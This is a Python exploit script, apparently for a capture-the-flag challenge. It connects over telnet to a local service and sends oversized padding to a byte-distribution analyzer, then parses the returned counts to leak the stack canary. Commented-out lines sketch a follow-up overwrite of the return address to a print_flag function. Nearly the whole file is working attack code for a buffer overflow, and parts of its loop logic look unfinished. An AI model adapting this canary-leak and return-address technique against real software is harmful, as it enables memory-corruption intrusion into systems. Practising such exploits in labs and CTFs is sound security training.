#!/usr/bin/python3

import os
import socket
import telnetlib



ENTER = '\n'
REPEAT_CHAR = b'\x00'
CANARY_SIZE = 0x10



def get_data_for_distribution(n):
    '''
        Returns the data that needs to be sent in order to get the last n bytes of the canary
    '''
    repeat = 0x408 + CANARY_SIZE - 1
    repeat -= n
    # data += b'B'*0x10   # overwrite base pointer and stuff
    # data += 0x40188d.to_bytes(8, 'little')  # set return address to print_flag
    return REPEAT_CHAR * repeat



def parse_distribution(output):
    result = {}
    lines = output.strip().split('\n')

    for line in lines:
        columns = line.split()
        if(columns[0][0].isdigit()):
            count = int(columns[1])
            if count != 0:
                byte = chr(int(columns[0])).encode('latin-1')
                result[byte] = count

    return result



def find_canary(telnet):
    data_count = str(0x418)
    data_count += ENTER

    canary = b''
    distribution = {}
    for i in range(2):
        data_to_send = get_data_for_distribution(CANARY_SIZE)
        data_to_send += ENTER.encode('ASCII')
        print(i)
        print('Data: ' + str(len(data_to_send)))

        output = telnet.read_until(b'analyzed?').decode('ASCII')
        print('Init: ' + output)
        telnet.write(data_count.encode('ASCII'))
        output = telnet.read_until(b'ENTER').decode('ASCII')
        print('Number entered: ' + output)
        telnet.write(data_to_send)
        print('Data entered: ' + output)

        new_distribution = parse_distribution(output)
        for byte, count in new_distribution.items():
            if (byte != REPEAT_CHAR and byte != ENTER.encode('ASCII')):
                if (byte not in distribution or distribution[byte] != count):
                    print('Found byte with new distribution: ' + str(byte) + '->' + str(count))
                    canary = byte + canary
        distribution = new_distribution
        print(canary)
        print(distribution)

    return canary



telnet = telnetlib.Telnet()
telnet.sock = socket.create_connection(('localhost', 2000))

# telnet.interact()
canary = find_canary(telnet)
# print(canary)



telnet.sock.close()

